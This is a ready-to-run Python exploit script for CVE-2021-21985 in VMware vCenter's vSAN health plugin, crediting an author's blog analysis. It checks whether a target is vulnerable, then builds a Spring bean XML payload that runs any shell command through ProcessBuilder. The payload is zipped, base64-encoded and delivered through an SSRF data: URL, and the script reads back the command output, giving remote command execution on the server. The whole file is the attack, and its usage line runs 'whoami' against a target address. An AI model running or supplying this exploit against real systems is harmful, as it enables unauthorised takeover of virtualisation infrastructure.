# coding: utf-8

"""
Author: hosch3n
Reference: https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
"""

import base64
from io import BytesIO
import json
import sys
import zipfile
import requests
import urllib3

urllib3.disable_warnings()
req = requests.session()

spel_xml = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ %s 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
    </bean>
</beans>"""

pyssrf = """https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html;base64,{}#"""
# pyssrf = """http://localhost:8006/vsanHealth/vum/driverOfflineBundle/data:text/html;base64,{}#"""

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Content-Type": "application/json"
}

def isVuln(target):
    try:
        url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
        result = req.get(url=url, verify=False)
        if result.status_code == 405:
            return True
        else:
            print(f"[ReqStatus]: {result.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None

class InMemoryZip(object):
    def __init__(self):
        # create the in-memory file-like object
        self.in_memory_zip = BytesIO()

    def append(self, filename_in_zip, file_contents):
        """ Appends a file with name filename_in_zip 
        and contents of file_contents to the in-memory zip.
        """
        # create a handle to the in-memory zip in append mode
        zf = zipfile.ZipFile(self.in_memory_zip, 'a',
                             zipfile.ZIP_DEFLATED, False)

        # write the file to the in-memory zip
        zf.writestr(filename_in_zip, file_contents)

        # mark the files as having been created on Windows
        # so that Unix permissions are not inferred as 0000
        for zfile in zf.filelist:
            zfile.create_system = 0
        return self

    def read(self):
        """ Returns a string with the contents of the in-memory zip.
        """
        self.in_memory_zip.seek(0)
        return self.in_memory_zip.read()

    def getb64zip(self):
        """
        get the in-memory zip to base64 encode
        """
        return base64.b64encode(self.read())

def do_attack(target, payload):
    try:
        url = f"{target}/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"
        post_data = {"methodInput": [[pyssrf.format(payload.decode("utf-8"))], True]}
        result = req.post(url=url, headers=headers, data=json.dumps(post_data), verify=False)
        return result
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None

def get_echo(target):
    try:
        url = f"{target}/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty"
        post_data = {"methodInput": ["output", None]}
        result = req.post(url=url, headers=headers, data=json.dumps(post_data), verify=False)
        return result
    except requests.exceptions.RequestException as e:
        print(f"[ReqError]: {e}\n=>{target}")
        return None

def main(argv):
    target = f"https://{argv[1]}"
    cmd = argv[2]
    result = isVuln(target)
    if result != True:
        print("[-] Maybe not SSRF Vuln [CVE-2021-21985]")
    imz = InMemoryZip()
    imz.append("offline_bundle.xml", (spel_xml % cmd))
    payload = imz.getb64zip()
    result = do_attack(target, payload)
    if result == None:
        print("[-] Using other gadgets")
    result = get_echo(target)
    try:
        echo = result.json()
        print(echo["result"])
    except:
        print(echo)

if __name__ == "__main__":
    try:
        main(sys.argv)
    except:
        print("Usage: python3 21985.py 1.1.1.1 whoami")